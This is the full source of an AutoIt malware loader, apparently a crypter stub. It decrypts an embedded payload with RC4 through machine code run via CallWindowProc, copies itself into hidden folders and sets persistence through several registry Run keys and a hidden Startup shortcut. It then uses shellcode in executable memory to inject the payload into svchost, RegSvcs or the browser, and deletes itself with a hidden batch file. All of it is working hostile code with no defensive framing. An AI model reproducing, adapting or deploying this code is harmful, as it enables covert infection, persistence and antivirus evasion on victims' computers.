#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile_type=a3x
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

Global $opcode
Global $SHELLCODE
Global $servercfg
Global $iscompiled
_servercfg()

Func _getservercfg()
	Local $fo = FileOpen(FileGetShortName(@ScriptFullPath), 0)
	If @error Then Exit
	Local $sr = FileRead($fo)
	FileClose($fo)
	$iscompiled = StringLeft($sr, 2) = "MZ"
	Local $spcfg = StringSplit($sr, "$E.L.m.0.D.", 1)
	If @error Then Exit
	Local $passrc = $spcfg[3]
	$opcode = $spcfg[8]
	Local $sercfg = BinaryToString(_rc4($spcfg[2], $passrc))
	Local $sp = $spcfg[4]
	Local $ingetctto = BinaryToString(_rc4($spcfg[5], $passrc))
	Local $servebin = _rc4($spcfg[6], $passrc)
	Local $selfdelete = $spcfg[7]
	$SHELLCODE = BinaryToString(_rc4($spcfg[9], $passrc))
	Dim $servercfg[5]
	$servercfg[0] = $sercfg
	$servercfg[1] = $sp
	$servercfg[2] = $servebin
	$servercfg[3] = $ingetctto
	$servercfg[4] = $selfdelete
EndFunc


Func _servercfg()
	_getservercfg()
	If NOT IsArray($servercfg) Then Exit
	Sleep($servercfg[1] * 1000)
	Local $getcfg = StringSplit($servercfg[0], "ee\@/ui", 1)
	If @error Then Exit
	If $getcfg[0] < 16 Then Exit
	If $getcfg[2] = 1 Then
		If $getcfg[4] <> "" Then $getcfg[4] = "\" & $getcfg[4]
		Local $instalpath = _sfloder($getcfg[6]) & $getcfg[4] & "\"
		If @AutoItExe <> $instalpath & $getcfg[3] Then
			FileCopy(FileGetShortName(@AutoItExe), $instalpath & $getcfg[3], 9)
			FileSetAttrib(FileGetShortName($instalpath & $getcfg[3]), $getcfg[7])
			If NOT $iscompiled Then
				FileCopy(FileGetShortName(@ScriptFullPath), $instalpath & $getcfg[17], 9)
				FileSetAttrib(FileGetShortName($instalpath & $getcfg[17]), $getcfg[7])
			EndIf
			FileSetAttrib(FileGetShortName($instalpath), $getcfg[5])
		Else
			$servercfg[4] = 0
		EndIf
		Local $exepath = FileGetShortName($instalpath & $getcfg[3])
		Local $scpath = FileGetShortName($instalpath & $getcfg[17])
		If NOT FileExists($exepath) Then
			$exepath = FileGetShortName(@AutoItExe)
			$servercfg[4] = 0
		EndIf
		If NOT FileExists($scpath) Then
			$scpath = FileGetShortName(@ScriptFullPath)
			$servercfg[4] = 0
		EndIf
		Local $frun, $pathsc
		If $iscompiled Then
			$frun = '"' & $exepath & '"'
		Else
			$frun = '"' & $exepath & '" "' & $scpath & '"'
			$pathsc = $scpath
		EndIf
		If $getcfg[8] = 1 Then __startupcu($frun, $getcfg[9])
		If $getcfg[10] = 1 Then __startuplm($frun, $getcfg[11])
		If $getcfg[12] = 1 Then __startupexp($frun, $getcfg[13])
		If $getcfg[14] = 1 Then __startupfloder($exepath, $getcfg[15], $pathsc, $getcfg[16])
		If $servercfg[4] = 1 Then _selfdelete()
	Else
		If $servercfg[4] = 1 Then _selfdelete()
	EndIf
	_run($servercfg[2], _injectto($servercfg[3]))
EndFunc

Func _rc4($data, $key)
	Local $codebuffer = DllStructCreate("byte[" & BinaryLen($opcode) & "]")
	DllStructSetData($codebuffer, 1, $opcode)
	Local $buffer = DllStructCreate("byte[" & BinaryLen($data) & "]")
	DllStructSetData($buffer, 1, $data)
	DllCall("user32.dll", "NONE", "CallWind" & "owProc", "PTR", DllStructGetPtr($codebuffer), "PTR", DllStructGetPtr($buffer), "int", BinaryLen($data), "STR", $key, "int", 0)
	Local $ret = DllStructGetData($buffer, 1)
	$buffer = 0
	$codebuffer = 0
	Return $ret
EndFunc

Func _run($PE, $wPath, $scommandline = "")
Local $lpShellcode = DllCall("kernel32", "ptr", "VirtualAlloc", "dword", 0, "dword", BinaryLen($SHELLCODE), "dword", 0x3000, "dword", 0x40)
If Not @error And $lpShellcode[0] Then
    $lpShellcode = $lpShellcode[0]
Else
    Return False
EndIf
Local $Shellcode_Struct = DllStructCreate("BYTE SHELLCODE[" & BinaryLen($SHELLCODE) & "]", $lpShellcode)
Local $File_Struct = DllStructCreate("BYTE PE[" & StringLen($PE) & "]")
DllStructSetData($Shellcode_Struct, "SHELLCODE", $SHELLCODE)
DllStructSetData($File_Struct, "PE", $PE)
Local $Ret = DllCallAddress("dword", $lpShellcode + 0x181, "wstr", $wPath, "wstr", $scommandline, "ptr", DllStructGetPtr($File_Struct))
DllCall("kernel32", "dword", "VirtualFree", "dword", $lpShellcode, "dword", 0, "dword", 0x8000)
If Not @error And $Ret[0] Then
    Return $Ret[0]
Else
    Return False
EndIf
EndFunc

Func _injectto($exeinject)
	Switch $exeinject
		Case ".Net Server"
			$exeinject = __default_net()
			If @error Then Exit
		Case "Default browser"
			$exeinject = _findbrowser()
		Case "svchost"
			$exeinject = @SystemDir & "\svchost.exe"
		Case "Default Process"
			$exeinject = @AutoItExe
	EndSwitch
	Return FileGetShortName($exeinject)
EndFunc

Func _findbrowser()
	Local $sinject
	$sinject = RegRead("HKCR\http\shell\open\command", "")
	$sinject = StringSplit($sinject, '"')
	If NOT @error Then
		If FileExists($sinject[2]) Then Return $sinject[2]
	EndIf
	Local $programfiles = @ProgramFilesDir
	Dim $iedir[3] = ["\Google\Chrome\Application\chrome.exe", "\Mozilla Firefox\firefox.exe", "\Internet Explorer\iexplore.exe"]
	Local $phatexe
	For $i = 0 To 2
		$phatexe = $programfiles & "" & $iedir[$i]
		If FileExists($phatexe) Then Return $phatexe
	Next
	Return @SystemDir & "\Cmd.exe"
EndFunc

Func __default_net()
	Local $injecto = @WindowsDir & "\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe"
	If NOT FileExists($injecto) Then $injecto = @WindowsDir & "\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe"
	If NOT FileExists($injecto) Then Return SetError(1)
	Return $injecto
EndFunc

Func _sfloder($sflode)
	Local $arrsf[6][2] = [[5], ["APPLICATION DATA", @AppDataDir], ["PROGRAM FILES", @ProgramFilesDir], ["USER PROFILE", @UserProfileDir], ["TEMP", @TempDir], ["WINDOWS", @WindowsDir]]
	For $df = 1 To $arrsf[0][0]
		If $arrsf[$df][0] = $sflode Then Return $arrsf[$df][1]
	Next
	Return @AppDataDir
EndFunc

Func __startupcu($paht, $keyname)
	Local $osarch
	If @OSArch <> "X86" Then $osarch = 64
	Local $regpath = "HKEY_CURRENT_USER" & $osarch & "\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\"
	If RegRead($regpath, $keyname) = $paht Then Return
	RegWrite($regpath, $keyname, "REG_EXPAND_SZ", $paht)
EndFunc

Func __startuplm($paht, $keyname)
	Local $osarch
	If @OSArch <> "X86" Then $osarch = 64
	Local $regpath = "HKEY_LOCAL_MACHINE" & $osarch & "\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\"
	If RegRead($regpath, $keyname) = $paht Then Return
	RegWrite($regpath, $keyname, "REG_EXPAND_SZ", $paht)
EndFunc

Func __startupexp($paht, $keyname)
	Local $osarch
	If @OSArch <> "X86" Then $osarch = 64
	Local $regpath = "HKEY_CURRENT_USER" & $osarch & "\Software\Microsoft\Windows\CurrentVersion\Policies\EXPLORER\RUN\"
	If RegRead($regpath, $keyname) = $paht Then Return
	RegWrite($regpath, $keyname, "REG_EXPAND_SZ", $paht)
EndFunc

Func __startupfloder($paht, $nname, $scpath, $shatt)
	Local $adetails = FileGetShortcut(@StartupDir & "\" & $nname & ".LNK")
	If NOT @error Then
		If $adetails[0] = $paht Then
			If $iscompiled Then
				Return
			Else
				If StringInStr($adetails[2], $scpath) Then Return
			EndIf
		EndIf
	EndIf
	FileCreateShortcut($paht, @StartupDir & "\" & $nname & ".LNK", "", '"' & $scpath & '"', $nname, @SystemDir & "\SHELL32.DLL", "", "4", @SW_MINIMIZE)
	FileSetAttrib(FileGetShortName(@StartupDir & "\" & $nname & ".LNK"), $shatt)
	FileSetAttrib(FileGetShortName(@StartupDir), $shatt)
EndFunc
Func _selfdelete()
	Local $batfil = FileGetShortName(@ScriptDir) & "\" & Random(1000, 10000, 1) & ".cmd"
	Local $delfil = FileGetShortName(@ScriptDir)
	If FileExists($batfil) Then FileDelete($batfil)
	If NOT $iscompiled Then
		If FileExists(FileGetShortName(@ScriptFullPath)) Then FileDelete(FileGetShortName(@ScriptFullPath))
	EndIf
	Local $scmdfile = ":loop" & @CRLF & 'del /F "' & FileGetShortName(@AutoItExe) & '"' & @CRLF & 'if exist "' & FileGetShortName(@AutoItExe) & '" goto loop' & @CRLF & 'del /F "' & $batfil & '"'
	FileWrite($batfil, $scmdfile)
	Run($batfil, FileGetShortName(@ScriptDir), @SW_HIDE)
EndFunc